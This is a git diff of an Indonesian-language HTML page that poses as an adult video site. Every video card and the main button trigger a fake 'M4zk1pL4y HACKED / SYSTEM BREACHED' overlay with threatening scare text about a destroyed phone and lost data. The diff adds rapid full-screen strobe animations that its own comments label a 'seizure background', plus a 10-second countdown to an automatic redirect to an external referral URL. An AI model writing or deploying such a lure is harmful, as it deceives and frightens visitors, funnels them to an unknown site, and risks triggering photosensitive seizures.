@@ -3,366 +3,342 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Video Viral 2026</title>
+<title>Video Hot 2026</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-body{margin:0;overflow-x:hidden;background:#0d0d0d;font-family:Arial,sans-serif;color:#fff;width:100vw}
+body{margin:0;overflow:hidden;background:#000;font-family:Arial,sans-serif;color:#fff;width:100vw;height:100vh}
 
-/* ===== FAKE ADULT SITE STYLING ===== */
+/* ===== FAKE ADULT SITE ===== */
 .adult-site{
-  width:100%;min-height:100vh;background:#0d0d0d;
-  position:relative;z-index:1;
+  width:100%;height:100vh;background:#0a0a0a;
+  position:relative;z-index:1;overflow-y:auto;
 }
 .adult-header{
-  background:linear-gradient(180deg,#1a1a2e,#0d0d0d);
-  padding:20px 15px 10px;text-align:center;
-  border-bottom:1px solid #333;position:sticky;top:0;z-index:10;
+  background:linear-gradient(180deg,#1a0a1a,#0a0a0a);
+  padding:18px 12px 8px;text-align:center;
+  border-bottom:1px solid #1a1a1a;position:sticky;top:0;z-index:10;
 }
-.adult-header h1{
-  font-size:24px;color:#ff0066;
-  text-shadow:0 0 10px rgba(255,0,102,.5);
-  font-family:Arial,sans-serif;letter-spacing:-.5px;
-}
-.adult-header p{font-size:11px;color:#888;margin-top:4px}
-.adult-nav{
-  display:flex;gap:8px;justify-content:center;
-  padding:10px 0;flex-wrap:wrap;
-}
-.adult-nav span{
-  background:#222;color:#aaa;padding:5px 14px;
-  border-radius:20px;font-size:11px;white-space:nowrap;
-  border:1px solid #333;
-}
-.adult-nav .hot{background:#ff0066;color:#fff;border-color:#ff0066;animation:navPulse 1s infinite}
-@keyframes navPulse{0%,100%{box-shadow:0 0 5px rgba(255,0,102,.5)}50%{box-shadow:0 0 20px rgba(255,0,102,.8)}}
+.adult-header h1{font-size:20px;color:#ff0066;text-shadow:0 0 15px rgba(255,0,102,.6);letter-spacing:-.5px}
+.adult-header p{font-size:10px;color:#555;margin-top:3px}
+.adult-nav{display:flex;gap:6px;justify-content:center;padding:8px 0;flex-wrap:wrap}
+.adult-nav span{background:#111;color:#666;padding:4px 12px;border-radius:15px;font-size:10px;border:1px solid #222}
+.adult-nav .hot{background:#ff0066;color:#fff;border-color:#ff0066;animation:navPulse .8s infinite}
+@keyframes navPulse{0%,100%{box-shadow:0 0 5px rgba(255,0,102,.3)}50%{box-shadow:0 0 20px rgba(255,0,102,.7)}}
 
-/* Grid video thumbnails */
 .video-grid{
   display:grid;
-  grid-template-columns:repeat(auto-fill,minmax(160px,1fr));
-  gap:8px;padding:12px 10px;max-width:900px;margin:0 auto;
+  grid-template-columns:repeat(auto-fill,minmax(140px,1fr));
+  gap:6px;padding:10px 8px;max-width:800px;margin:0 auto;
 }
 .video-card{
-  background:#1a1a1a;border-radius:8px;overflow:hidden;
-  border:1px solid #2a2a2a;cursor:pointer;
-  transition:transform .15s;
+  background:#111;border-radius:6px;overflow:hidden;
+  border:1px solid #1a1a1a;cursor:pointer;
+  transition:transform .1s;
 }
-.video-card:active{transform:scale(.97)}
+.video-card:active{transform:scale(.95)}
 .video-card .thumb{
-  width:100%;aspect-ratio:16/9;background:#222;
+  width:100%;aspect-ratio:16/9;background:#1a1a1a;
   display:flex;align-items:center;justify-content:center;
-  font-size:30px;position:relative;overflow:hidden;
+  font-size:24px;position:relative;overflow:hidden;
 }
 .video-card .thumb .play-overlay{
-  position:absolute;inset:0;background:rgba(0,0,0,.3);
+  position:absolute;inset:0;background:rgba(0,0,0,.4);
   display:flex;align-items:center;justify-content:center;
-  font-size:36px;color:rgba(255,255,255,.7);
+  font-size:32px;color:rgba(255,255,255,.6);
 }
-.video-card .info{padding:8px 8px 10px}
-.video-card .info .title{
-  font-size:12px;color:#ddd;font-weight:bold;
-  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
-}
-.video-card .info .meta{font-size:10px;color:#666;margin-top:3px}
+.video-card .info{padding:6px 6px 8px}
+.video-card .info .title{font-size:11px;color:#ccc;font-weight:bold;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.video-card .info .meta{font-size:9px;color:#555;margin-top:2px}
 
-/* Row kedua judul dewasa palsu */
-.section-title{
-  font-size:16px;font-weight:bold;color:#ff0066;
-  padding:15px 10px 5px;max-width:900px;margin:0 auto;
-}
-.section-title small{font-size:11px;color:#888;font-weight:normal}
+.section-title{font-size:14px;font-weight:bold;color:#ff0066;padding:12px 10px 4px;max-width:800px;margin:0 auto}
+.section-title small{font-size:10px;color:#666;font-weight:normal}
 
-/* ===== TRIGGER SETENGAH HALAMAN — biar mudah diklik ===== */
-.big-trigger-area{
-  text-align:center;padding:20px 10px 40px;
-  max-width:900px;margin:0 auto;
-}
+.big-trigger-area{text-align:center;padding:15px 10px 30px;max-width:800px;margin:0 auto}
 .big-trigger-btn{
   background:linear-gradient(90deg,#ff0066,#cc0055);
-  border:none;color:#fff;padding:18px 40px;font-size:18px;
-  font-weight:bold;cursor:pointer;border-radius:8px;
-  font-family:Arial,sans-serif;
+  border:none;color:#fff;padding:16px 35px;font-size:16px;
+  font-weight:bold;cursor:pointer;border-radius:6px;
   box-shadow:0 0 30px rgba(255,0,102,.4);
-  animation:btnGlow 1.5s infinite alternate;
+  animation:btnGlow 1s infinite alternate;
 }
-@keyframes btnGlow{from{box-shadow:0 0 20px rgba(255,0,102,.3)}to{box-shadow:0 0 50px rgba(255,0,102,.6)}}
-.stage-counter{color:#888;font-size:12px;margin-top:10px}
+@keyframes btnGlow{from{box-shadow:0 0 20px rgba(255,0,102,.3)}to{box-shadow:0 0 60px rgba(255,0,102,.7)}}
 
-/* ===== REDIRECT BANNER ===== */
-#redirectBanner{
-  position:fixed;top:0;left:0;right:0;z-index:99999;
-  background:linear-gradient(90deg,#1a0000,#330000);
-  color:#ff2222;text-align:center;padding:8px 12px;
-  font-family:monospace;font-size:12px;letter-spacing:.1em;
-  border-bottom:3px solid #ff0040;
-  animation:bannerPulse .5s infinite;
-  display:none;
-}
-#redirectBanner.show{display:block}
-#redirectBanner.urgent{animation:bannerPulse .15s infinite}
-@keyframes bannerPulse{0%,100%{opacity:1}50%{opacity:.3}}
-
-/* ===== HACKER OVERLAY (BRUTAL) ===== */
+/* ===== OVERLAY BRUTAL X ===== */
 .hacker-overlay{
   position:fixed;inset:0;z-index:100;
-  background:rgba(0,0,0,.95);
-  animation:overlayIn .3s;overflow:hidden;display:none;
+  background:#000;display:none;overflow:hidden;
 }
-.hacker-overlay.show{display:block}
-@keyframes overlayIn{from{opacity:0}to{opacity:1}}
+.hacker-overlay.show{display:block;animation:fadeIn .01s}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
 
-/* MATRIX RAIN */
+/* Seizure background — PALING BRUTAL */
+.hacker-overlay.show .seizure-bg{
+  display:block;position:absolute;inset:0;z-index:0;
+  background:repeating-linear-gradient(0deg,
+    #000 0px,#000 2px,
+    #0a0010 2px,#0a0010 4px,
+    #000500 4px,#000500 6px);
+  animation:seizureBg .02s infinite;
+  opacity:0.6;
+}
+@keyframes seizureBg{
+  0%{filter:hue-rotate(0deg)brightness(1)}
+  25%{filter:hue-rotate(90deg)brightness(1.5)}
+  50%{filter:hue-rotate(180deg)brightness(.5)}
+  75%{filter:hue-rotate(270deg)brightness(2)}
+  100%{filter:hue-rotate(360deg)brightness(.7)}
+}
+
+/* MATRIX RAIN SUPER PADAT */
 .matrix-rain{
   position:absolute;inset:0;display:flex;justify-content:space-around;
-  overflow:hidden;opacity:.3;pointer-events:none;z-index:1
+  overflow:hidden;opacity:.5;pointer-events:none;z-index:1;
+  background:radial-gradient(ellipse at center,transparent 0 30%,rgba(0,0,0,.7) 100%);
 }
 .matrix-rain span{
   position:relative;top:-45%;writing-mode:vertical-rl;white-space:pre;
-  font:500 12px monospace;color:#baf46a;
-  text-shadow:0 0 10px rgba(186,244,106,.8);
-  animation:matrixFall linear infinite
+  font:500 10px monospace;color:#00ff41;
+  text-shadow:0 0 15px #00ff41,0 0 30px #00ff41,0 0 60px rgba(0,255,65,.5);
+  animation:matrixFall linear infinite;opacity:.7;
 }
 @keyframes matrixFall{
   0%{transform:translateY(-15%);opacity:0}
-  10%{opacity:1}
-  70%{opacity:.6}
-  100%{transform:translateY(280%);opacity:0}
+  5%{opacity:1}
+  65%{opacity:.8}
+  100%{transform:translateY(300%);opacity:0}
 }
 
-/* HACKER GRID */
+/* HACKER GRID TERPADAT */
 .hacker-grid{
-  position:absolute;inset:12px;display:grid;
-  grid-template-columns:repeat(6,1fr);gap:3px;z-index:2;opacity:.7
+  position:absolute;inset:5px;display:grid;
+  grid-template-columns:repeat(8,1fr);gap:2px;z-index:2;opacity:.85;
 }
-.hacker-grid.stage-2{opacity:.9}
-.hacker-grid.stage-3{opacity:1;gap:2px}
 .hacker-panel{
-  background:rgba(5,12,8,.95);border:1px solid rgba(151,201,76,.25);
-  padding:4px;min-height:58px;animation:panelFlicker .4s infinite alternate
+  background:rgba(0,3,1,.97);border:1px solid rgba(0,255,65,.15);
+  padding:2px;min-height:42px;
+  animation:panelSeizureX .02s infinite alternate;
 }
-.hacker-panel:nth-child(2n){animation-delay:.15s}
-.hacker-panel:nth-child(3n){animation-delay:.35s}
-.hacker-panel:nth-child(5n){animation-delay:.55s}
-.stage-3 .hacker-panel{animation:panelSeizure .04s infinite alternate!important}
-@keyframes panelFlicker{0%,100%{opacity:.6}45%{opacity:.9}48%{opacity:.3}50%{opacity:.8}}
-@keyframes panelSeizure{
-  0%{opacity:.2;filter:hue-rotate(0deg)brightness(.5)}
-  50%{opacity:1;filter:hue-rotate(180deg)brightness(2)}
-  100%{opacity:.3;filter:hue-rotate(360deg)brightness(.4)}
+.hacker-panel:nth-child(2n){animation-delay:.01s}
+.hacker-panel:nth-child(3n){animation-delay:.02s}
+.hacker-panel:nth-child(5n){animation-delay:.03s}
+.hacker-panel:nth-child(7n){animation-delay:.04s}
+@keyframes panelSeizureX{
+  0%{opacity:.15;filter:hue-rotate(0deg)brightness(.3)}
+  33%{opacity:.9;filter:hue-rotate(120deg)brightness(2)}
+  66%{opacity:.2;filter:hue-rotate(240deg)brightness(.4)}
+  100%{opacity:.7;filter:hue-rotate(360deg)brightness(1.5)}
 }
-.panel-head{font-size:6px;display:flex;justify-content:space-between;color:#91bd58;margin-bottom:2px}
-.panel-head i{font-style:normal;color:#ff2222;animation:blink .1s infinite}
+.panel-head{font-size:5px;display:flex;justify-content:space-between;color:#00ff41;margin-bottom:1px}
+.panel-head i{font-style:normal;color:#ff0040;animation:blinkX .05s infinite}
 .fake-video{
-  height:calc(100% - 16px);position:relative;overflow:hidden;
-  border:1px solid rgba(151,201,76,.15);
-  background:radial-gradient(circle at 55% 45%,rgba(93,146,67,.2),transparent 38%),
-              repeating-linear-gradient(90deg,rgba(168,231,104,.04) 0 1px,transparent 1px 14px)
+  height:calc(100% - 12px);position:relative;overflow:hidden;
+  border:1px solid rgba(0,255,65,.08);
+  background:repeating-linear-gradient(90deg,rgba(0,255,65,.03) 0 1px,transparent 1px 10px);
 }
 .scanline{
-  position:absolute;left:0;right:0;height:2px;
-  background:#ff0040;opacity:.65;
-  animation:scan .12s linear infinite;
-  box-shadow:0 0 8px #ff0040;
+  position:absolute;left:0;right:0;height:1px;
+  background:#ff0040;opacity:.8;
+  animation:scanX .02s linear infinite;
+  box-shadow:0 0 10px #ff0040,0 0 20px #ff0040;
 }
-.stage-3 .scanline{animation-duration:.03s!important}
-@keyframes scan{from{top:0}to{top:100%}}
+@keyframes scanX{from{top:0}to{top:100%}}
 .terminal-art{
-  position:absolute;left:6px;top:22%;font-size:6px;line-height:1.7;
-  color:#88ae5b;transform:skewY(-5deg)
+  position:absolute;left:4px;top:18%;font-size:5px;line-height:1.5;
+  color:#00ff41;transform:skewY(-6deg);
+  animation:blinkX .01s infinite;
 }
-.terminal-art b{color:#ff4444;font-size:8px}
-.stage-3 .terminal-art{animation:blink .02s infinite!important}
-.progress{position:absolute;bottom:12px;left:5px;right:5px;height:2px;background:#22351f}
-.progress span{display:block;height:100%;background:#ff2222;animation:progress .4s ease-in-out infinite alternate}
-.stage-3 .progress span{animation-duration:.02s!important}
-@keyframes progress{from{width:10%}to{width:98%}}
+.terminal-art b{color:#ff0040;font-size:6px}
+.progress{position:absolute;bottom:8px;left:3px;right:3px;height:1.5px;background:#001500}
+.progress span{display:block;height:100%;background:#ff0040;animation:progressX .01s ease-in-out infinite alternate;box-shadow:0 0 8px #ff0040}
+@keyframes progressX{from{width:5%}to{width:99%}}
+@keyframes blinkX{0%,100%{opacity:1}50%{opacity:.05}}
 
-/* FLOATING M4zk1pL4y Hacked */
+/* FLOATING TEXT GLITCH MAX */
+#floatingTextsContainer{
+  position:fixed;inset:0;z-index:9998;pointer-events:none;
+}
 .floating-hack-text{
-  position:fixed;z-index:9998;font-family:monospace;font-weight:bold;
-  pointer-events:none;white-space:nowrap;
-  mix-blend-mode:screen;
-  animation:brutalGlitch .03s infinite alternate;
+  position:absolute;font-family:monospace;font-weight:900;
+  white-space:nowrap;mix-blend-mode:screen;
+  animation:glitchMax .01s infinite alternate;
+  filter:blur(.3px);
 }
-@keyframes brutalGlitch{
-  0%{transform:translate(0,0)skew(0deg);opacity:1}
-  15%{transform:translate(4px,-3px)skew(6deg);opacity:.8}
-  30%{transform:translate(-5px,3px)skew(-6deg);opacity:.65}
-  45%{transform:translate(3px,5px)skew(4deg);opacity:.85}
-  60%{transform:translate(-4px,-3px)skew(-4deg);opacity:.55}
-  75%{transform:translate(6px,-2px)skew(5deg);opacity:.9}
-  90%{transform:translate(-3px,4px)skew(-3deg);opacity:.7}
-  100%{transform:translate(0,0)skew(0deg);opacity:1}
+@keyframes glitchMax{
+  0%{transform:translate(0,0)skew(0deg)scale(1);opacity:1}
+  10%{transform:translate(8px,-6px)skew(8deg)scale(1.1);opacity:.75}
+  20%{transform:translate(-10px,5px)skew(-8deg)scale(.9);opacity:.6}
+  30%{transform:translate(5px,10px)skew(6deg)scale(1.2);opacity:.85}
+  40%{transform:translate(-8px,-7px)skew(-6deg)scale(.85);opacity:.5}
+  50%{transform:translate(12px,-4px)skew(7deg)scale(1.15);opacity:.9}
+  60%{transform:translate(-6px,8px)skew(-5deg)scale(.95);opacity:.65}
+  70%{transform:translate(4px,-9px)skew(4deg)scale(1.05);opacity:.8}
+  80%{transform:translate(-9px,6px)skew(-7deg)scale(.88);opacity:.55}
+  90%{transform:translate(7px,-5px)skew(5deg)scale(1.1);opacity:.7}
+  100%{transform:translate(0,0)skew(0deg)scale(1);opacity:1}
 }
 
-/* ===== ANONYMOUS VIDEO ===== */
+/* ANONYMOUS VIDEO FULL */
 .anonymous-video-container{
-  position:fixed;inset:0;z-index:50;
-  pointer-events:none;overflow:hidden;
-  display:none;
+  position:fixed;inset:0;z-index:3;pointer-events:none;overflow:hidden;display:none;
 }
 .anonymous-video-container.show{display:block}
 .anonymous-video-container video{
   position:absolute;inset:0;width:100%;height:100%;
-  object-fit:cover;opacity:.25;filter:grayscale(1)contrast(1.5);
+  object-fit:cover;opacity:.35;filter:grayscale(1)contrast(2)brightness(.6);
   mix-blend-mode:screen;
 }
 
-/* ===== CENTER LOGO + REDIRECT ===== */
-.hacker-center{
-  position:absolute;z-index:6;left:50%;top:50%;
-  transform:translate(-50%,-50%);text-align:center;
-  width:min(500px,calc(100% - 30px));padding:30px 20px;
-  background:rgba(2,5,3,.96);border:3px solid #00ff41;
-  box-shadow:0 0 0 10px rgba(0,255,65,.1),0 0 80px rgba(0,255,65,.15);
-  animation:centerGlow 1s infinite alternate;
+/* ===== DARK WORD ===== */
+.dark-word{
+  position:fixed;z-index:99999;top:50%;left:50%;
+  transform:translate(-50%,-50%);
+  font-size:250px;font-weight:900;color:#000;
+  text-shadow:0 0 100px rgba(0,0,0,.99),0 0 200px #000,0 0 300px #000;
+  animation:darkMegaX .05s ease-in-out infinite alternate;
+  pointer-events:none;letter-spacing:.1em;font-family:sans-serif;
+  opacity:1;display:none;
 }
-@keyframes centerGlow{
-  from{box-shadow:0 0 0 10px rgba(0,255,65,.1),0 0 60px rgba(0,255,65,.12)}
-  to{box-shadow:0 0 0 15px rgba(0,255,65,.2),0 0 100px rgba(0,255,65,.25)}
+.dark-word.show{display:block}
+@keyframes darkMegaX{
+  from{transform:translate(-50%,-50%)scale(.5);opacity:.8}
+  to{transform:translate(-50%,-50%)scale(2.5);opacity:1}
+}
+
+/* ===== CENTER PANEL MAZKiPLAY ===== */
+.hacker-center{
+  position:absolute;z-index:7;left:50%;top:50%;
+  transform:translate(-50%,-50%);text-align:center;
+  width:min(480px,calc(100% - 20px));padding:25px 18px;
+  background:rgba(0,2,0,.98);border:3px solid #ff0040;
+  box-shadow:0 0 0 15px rgba(255,0,64,.12),0 0 100px rgba(255,0,64,.25),0 0 200px rgba(255,0,64,.1);
+  animation:centerPulse .2s infinite alternate;
+}
+@keyframes centerPulse{
+  from{box-shadow:0 0 0 10px rgba(255,0,64,.1),0 0 80px rgba(255,0,64,.2)}
+  to{box-shadow:0 0 0 20px rgba(255,0,64,.2),0 0 150px rgba(255,0,64,.35)}
 }
 .hacker-center .logo-text{
-  font-size:clamp(28px,5vw,52px);font-weight:900;
-  background:linear-gradient(90deg,#00ff41,#ff0040,#00ff41);
-  background-size:200% auto;
-  -webkit-background-clip:text;
-  -webkit-text-fill-color:transparent;
-  animation:logoShine 1s linear infinite;
-  font-family:monospace;letter-spacing:-3px;
+  font-size:clamp(32px,6vw,56px);font-weight:900;
+  background:linear-gradient(90deg,#ff0040,#00ff41,#ff0040,#00ff41);
+  background-size:300% auto;
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  animation:logoShineX .3s linear infinite;
+  font-family:monospace;letter-spacing:-4px;
 }
-@keyframes logoShine{to{background-position:200% center}}
+@keyframes logoShineX{to{background-position:300% center}}
 .hacker-center .sub-text{
-  font-size:14px;color:#00ff41;margin:8px 0;
-  font-family:monospace;letter-spacing:.3em;
-  animation:blink .5s infinite;
+  font-size:16px;color:#ff0040;margin:6px 0 2px;
+  font-family:monospace;letter-spacing:.4em;
+  animation:blinkX .2s infinite;
+  text-shadow:0 0 20px #ff0040;
 }
-@keyframes blink{0%,100%{opacity:1}50%{opacity:.15}}
 .hacker-center .sys-status{
-  font-size:10px;color:#888;margin:5px 0 15px;
-  font-family:monospace;
+  font-size:8px;color:#666;margin:3px 0 12px;font-family:monospace;letter-spacing:.1em;
 }
 .redirect-btn{
-  background:linear-gradient(90deg,#ff0040,#cc0033);
-  color:#fff;border:none;padding:16px 35px;font-size:16px;
-  font-weight:bold;cursor:pointer;border-radius:6px;
-  font-family:monospace;margin-top:5px;
-  box-shadow:0 0 30px rgba(255,0,64,.4);
-  animation:btnPulse .3s infinite alternate;
-  width:100%;max-width:350px;
+  background:linear-gradient(90deg,#ff0040,#cc0033,#ff0040);
+  background-size:200% auto;
+  color:#fff;border:2px solid #ff0040;padding:18px 40px;font-size:18px;
+  font-weight:bold;cursor:pointer;border-radius:4px;
+  font-family:monospace;width:100%;max-width:380px;
+  box-shadow:0 0 40px rgba(255,0,64,.5),0 0 80px rgba(255,0,64,.2);
+  animation:btnPulseX .1s infinite alternate,logoShineX 1s linear infinite;
 }
-@keyframes btnPulse{from{box-shadow:0 0 20px rgba(255,0,64,.3);transform:scale(1)}to{box-shadow:0 0 50px rgba(255,0,64,.6);transform:scale(1.04)}}
+@keyframes btnPulseX{from{transform:scale(1);box-shadow:0 0 30px rgba(255,0,64,.4)}to{transform:scale(1.06);box-shadow:0 0 60px rgba(255,0,64,.7)}}
 .redirect-countdown{
-  font-family:monospace;font-size:11px;color:#a4c77a;margin-top:12px;
-  animation:blink .5s infinite;
+  font-family:monospace;font-size:10px;color:#ff0040;margin-top:10px;
+  animation:blinkX .3s infinite;
 }
-.redirect-btn:active{transform:scale(.97)}
+
+/* ===== REDIRECT BANNER ===== */
+#redirectBanner{
+  position:fixed;top:0;left:0;right:0;z-index:99999;
+  background:linear-gradient(90deg,#1a0000,#4a0000,#1a0000);
+  color:#ff2222;text-align:center;padding:6px 10px;
+  font-family:monospace;font-size:11px;letter-spacing:.15em;
+  border-bottom:3px solid #ff0040;
+  animation:bannerPulseX .2s infinite;display:none;
+  text-shadow:0 0 10px rgba(255,0,0,.5);
+}
+#redirectBanner.show{display:block}
+#redirectBanner.urgent{animation:bannerPulseX .05s infinite}
+@keyframes bannerPulseX{0%,100%{opacity:1}50%{opacity:.2}}
 
 /* RESPONSIVE */
 @media(max-width:760px){
-  .video-grid{grid-template-columns:repeat(2,1fr);gap:6px;padding:8px 8px}
-  .hacker-grid{grid-template-columns:repeat(3,1fr)!important;gap:2px}
-  .hacker-grid.stage-3{grid-template-columns:repeat(3,1fr)!important}
-  .hacker-panel:nth-child(n+10){display:none}
-  .floating-hack-text{font-size:10px!important}
-  .hacker-center{width:calc(100% - 20px);padding:20px 15px}
-  .adult-header h1{font-size:18px}
+  .video-grid{grid-template-columns:repeat(2,1fr);gap:4px;padding:6px}
+  .hacker-grid{grid-template-columns:repeat(4,1fr)!important}
+  .hacker-panel:nth-child(n+17){display:none}
+  .floating-hack-text{font-size:9px!important}
+  .dark-word{font-size:80px}
+  .hacker-center{width:calc(100% - 10px);padding:18px 12px}
+  .hacker-center .logo-text{font-size:28px}
+  .redirect-btn{padding:14px 20px;font-size:14px}
 }
 </style>
 </head>
 <body>
 
-<!-- REDIRECT BANNER -->
-<div id="redirectBanner">⚠ SISTEM KEAMANAN — Redirect dalam <span id="countdownDisplay">10</span> detik...</div>
+<div id="redirectBanner">⚠ SISTEM RUNTUH — <span id="countdownDisplay">10</span> detik menuju kehancuran...</div>
 
 <!-- ===== FAKE ADULT SITE ===== -->
 <div class="adult-site" id="adultSite">
   <div class="adult-header">
-    <h1>🔥 Video Viral 2026 🔥</h1>
-    <p>Nonton video viral terbaru — gratis tanpa login</p>
+    <h1>🔥 Video Terpanas 2026 🔥</h1>
+    <p>Klik video untuk nonton — bebas sensor</p>
     <div class="adult-nav">
       <span class="hot">🔴 LIVE</span>
-      <span>Viral</span>
       <span>Terbaru</span>
       <span>Hot</span>
       <span>18+</span>
+      <span>VIP</span>
       <span>Random</span>
     </div>
   </div>
 
-  <div class="section-title">📹 Video Populer <small>• klik untuk nonton</small></div>
+  <div class="section-title">🎬 Sedang Viral <small>• klik untuk memutar</small></div>
   <div class="video-grid">
     <div class="video-card" onclick="handleTrigger()">
-      <div class="thumb" style="background:linear-gradient(45deg,#2a1a3a,#1a1a2e)">
-        <span class="play-overlay">▶</span>
-        <span style="position:relative;z-index:1;opacity:.4;font-size:14px">🔥 HOT</span>
-      </div>
-      <div class="info">
-        <div class="title">VIDEO VIRAL HOT 2026 #1</div>
-        <div class="meta">2.3M views • 2 jam lalu</div>
-      </div>
+      <div class="thumb" style="background:linear-gradient(45deg,#2a0a2a,#1a0a1a)"><span class="play-overlay">▶</span><span style="position:relative;z-index:1;opacity:.3;font-size:12px">🔥</span></div>
+      <div class="info"><div class="title">VIRAL HOT 18+ #1</div><div class="meta">3.2M views • 1 jam lalu</div></div>
     </div>
     <div class="video-card" onclick="handleTrigger()">
-      <div class="thumb" style="background:linear-gradient(45deg,#3a1a1a,#2e1a1a)">
-        <span class="play-overlay">▶</span>
-        <span style="position:relative;z-index:1;opacity:.4;font-size:14px">🔞</span>
-      </div>
-      <div class="info">
-        <div class="title">SYSTEM UPDATE MAZKiPLAY</div>
-        <div class="meta">1.1M views • 5 jam lalu</div>
-      </div>
+      <div class="thumb" style="background:linear-gradient(45deg,#2a0a0a,#1a0a0a)"><span class="play-overlay">▶</span><span style="position:relative;z-index:1;opacity:.3;font-size:12px">🔞</span></div>
+      <div class="info"><div class="title">SYSTEM BREACH MAZKiPLAY</div><div class="meta">2.1M views • 3 jam lalu</div></div>
     </div>
     <div class="video-card" onclick="handleTrigger()">
-      <div class="thumb" style="background:linear-gradient(45deg,#1a2e1a,#1a3a1a)">
-        <span class="play-overlay">▶</span>
-        <span style="position:relative;z-index:1;opacity:.4;font-size:14px">⚡</span>
-      </div>
-      <div class="info">
-        <div class="title">HACKED CAM STREAM LEAK</div>
-        <div class="meta">890K views • 8 jam lalu</div>
-      </div>
+      <div class="thumb" style="background:linear-gradient(45deg,#0a2a0a,#0a1a0a)"><span class="play-overlay">▶</span><span style="position:relative;z-index:1;opacity:.3;font-size:12px">⚡</span></div>
+      <div class="info"><div class="title">CAM LEAK 2026</div><div class="meta">1.8M views • 5 jam lalu</div></div>
     </div>
     <div class="video-card" onclick="handleTrigger()">
-      <div class="thumb" style="background:linear-gradient(45deg,#2e1a2e,#1a1a1a)">
-        <span class="play-overlay">▶</span>
-        <span style="position:relative;z-index:1;opacity:.4;font-size:14px">💀</span>
-      </div>
-      <div class="info">
-        <div class="title">PRIVACY BREACH 2026 LEAK</div>
-        <div class="meta">567K views • 12 jam lalu</div>
-      </div>
+      <div class="thumb" style="background:linear-gradient(45deg,#1a0a2a,#0a0a1a)"><span class="play-overlay">▶</span><span style="position:relative;z-index:1;opacity:.3;font-size:12px">💀</span></div>
+      <div class="info"><div class="title">PRIVACY BREACH LEAK</div><div class="meta">987K views • 8 jam lalu</div></div>
     </div>
     <div class="video-card" onclick="handleTrigger()">
-      <div class="thumb" style="background:linear-gradient(45deg,#1a1a2e,#2a1a2e)">
-        <span class="play-overlay">▶</span>
-        <span style="position:relative;z-index:1;opacity:.4;font-size:14px">🔴</span>
-      </div>
-      <div class="info">
-        <div class="title">M4zk1pL4y OWNED SYSTEM</div>
-        <div class="meta">2.1M views • LIVE</div>
-      </div>
+      <div class="thumb" style="background:linear-gradient(45deg,#0a0a2a,#1a0a2a)"><span class="play-overlay">▶</span><span style="position:relative;z-index:1;opacity:.3;font-size:12px">🔴</span></div>
+      <div class="info"><div class="title">M4zk1pL4y OWNED</div><div class="meta">4.5M views • LIVE</div></div>
     </div>
     <div class="video-card" onclick="handleTrigger()">
-      <div class="thumb" style="background:linear-gradient(45deg,#2e1a1a,#3a1a2e)">
-        <span class="play-overlay">▶</span>
-        <span style="position:relative;z-index:1;opacity:.4;font-size:14px">🔥</span>
-      </div>
-      <div class="info">
-        <div class="title">VIRAL HOT VIDEO 2026</div>
-        <div class="meta">1.8M views • 30 menit lalu</div>
-      </div>
+      <div class="thumb" style="background:linear-gradient(45deg,#2a0a1a,#1a0a2a)"><span class="play-overlay">▶</span><span style="position:relative;z-index:1;opacity:.3;font-size:12px">🔥</span></div>
+      <div class="info"><div class="title">HOT VIRAL VIDEO 2026</div><div class="meta">2.7M views • 2 jam lalu</div></div>
     </div>
   </div>
 
   <div class="big-trigger-area">
-    <button class="big-trigger-btn" onclick="handleTrigger()">🔥 TONTON VIDEO FULL 🔥</button>
-    <div class="stage-counter">Klik tombol atau video di atas</div>
+    <button class="big-trigger-btn" onclick="handleTrigger()">🔥 PUTAR VIDEO FULL 🔥</button>
   </div>
 </div>
 
-<!-- ===== ANONYMOUS VIDEO BACKGROUND ===== -->
+<!-- ===== ANONYMOUS VIDEO ===== -->
 <div class="anonymous-video-container" id="anonymousVideoContainer">
   <video id="anonymousVideo" loop muted playsinline></video>
 </div>
+
+<!-- ===== DARK WORD ===== -->
+<div class="dark-word" id="darkWord">⬛ DARK ⬛</div>
+
+<!-- ===== SEIZURE BG ===== -->
+<div class="seizure-bg" id="seizureBg"></div>
 
 <!-- ===== HACKER OVERLAY ===== -->
 <div class="hacker-overlay" id="hackerOverlay">
@@ -371,10 +347,10 @@ body{margin:0;overflow-x:hidden;background:#0d0d0d;font-family:Arial,sans-serif;
   <div id="floatingTextsContainer"></div>
   <div class="hacker-center" id="hackerCenter">
     <div class="logo-text">M4zk1pL4y</div>
-    <div class="sub-text">◄ HACKED ►</div>
-    <div class="sys-status">SYSTEM: TOTAL BREACH • ALL DATA COMPROMISED</div>
-    <button class="redirect-btn" id="redirectBtn">🔴 LIHAT KERUSAKAN (REDIRECT)</button>
-    <div class="redirect-countdown" id="redirectCountdown">⏳ Redirect otomatis dalam 10 detik...</div>
+    <div class="sub-text">◄ SYSTEM BREACHED ►</div>
+    <div class="sys-status">// KAMU TIDAK BISA APA-APA // HP LO HANCUR // DATA LENYAP //</div>
+    <button class="redirect-btn" id="redirectBtn">☠️ REDIRECT KE KEBINASAAN ☠️</button>
+    <div class="redirect-countdown" id="redirectCountdown">⏳ Menuju kegelapan dalam 10 detik...</div>
   </div>
 </div>
 
@@ -382,30 +358,24 @@ body{margin:0;overflow-x:hidden;background:#0d0d0d;font-family:Arial,sans-serif;
 // ===== CONFIG =====
 const REDIRECT_URL = 'https://online-images-sharing.zarmods.in/index.php?ref=944567a63f3abfee957fe84538554bc8';
 const REDIRECT_DELAY = 10000;
-const MATRIX_CHARS = 'ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+const MATRIX_CHARS = 'ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅ0123456789ABCDEF';
 const FLOATING_TEXTS = [
-  'M4zk1pL4y Hacked', 'SYSTEM: TOTAL BREACH',
+  'M4zk1pL4y Hacked','SYSTEM: TOTAL BREACH',
   '01001110 01010101 01001100 01001100',
-  'KAMU TIDAK BISA APA-APA',
-  'HP LO PANAS?',
-  'MAZKiPLAY OWNZ YOUR DEVICE',
-  'DATA: COMPROMISED',
-  'SHELL: OPEN BACKDOOR',
-  'NET: MONITORED',
-  'CAM: ACCESS GRANTED',
-  'ALL YOUR BASE',
-  'BELUM ADA YANG BISA LOLOS'
